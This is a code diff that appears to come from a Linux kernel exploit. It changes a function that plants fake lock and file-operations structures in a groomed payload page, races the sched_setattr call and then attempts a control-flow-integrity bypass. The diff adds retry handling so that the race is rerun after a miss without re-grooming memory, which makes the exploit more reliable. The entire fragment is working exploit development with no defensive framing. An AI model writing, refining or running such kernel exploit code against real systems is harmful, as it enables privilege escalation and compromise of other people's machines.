@@ -187,9 +187,12 @@ void do_pselect_fake_lock_route(void) {
   int calls = 0;
   int success = 0;
   int route_verified = 0;
+  int signal_miss_retry = 0;
   for (int route_attempt = 1; route_attempt <= PSELECT_CFI_ROUTE_ATTEMPTS;
        route_attempt++) {
-    if (route_attempt != 1) {
+    /* On a signal-miss retry the payload page is still intact (no write
+     * happened), so skip the expensive re-groom and just re-run pselect. */
+    if (route_attempt != 1 && !signal_miss_retry) {
       page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
       if (!page_base || !fake_lock || !fake_fops) {
         cfi_last_step = 34;
@@ -200,6 +203,7 @@ void do_pselect_fake_lock_route(void) {
         break;
       }
     }
+    signal_miss_retry = 0;
 
     int pipefd[2];
     SYSCHK(pipe(pipefd));
@@ -316,6 +320,18 @@ void do_pselect_fake_lock_route(void) {
     close(pipefd[1]);
 
     if (route_quality_miss) {
+      continue;
+    }
+    if (!route_verified && !route_signal &&
+        route_attempt < PSELECT_CFI_ROUTE_ATTEMPTS) {
+      /* Consumer lost the sched_setattr race this attempt (calls=%d success=0):
+       * the walk didn't fire a successful adjust, so the CFI stage was skipped
+       * (step=33). This is racy run-to-run (a prior build hit success=1 on the
+       * same setup), so retry the whole route with a fresh pselect/reclaim
+       * instead of giving up after one unlucky attempt. */
+      pr_info("pselect route signal miss attempt=%d/%d calls=%d success=%d; retrying\n",
+              route_attempt, PSELECT_CFI_ROUTE_ATTEMPTS, calls, success);
+      signal_miss_retry = 1;
       continue;
     }
     if (route_verified || cfi_dirty_seen || cfi_last_step != 1) {
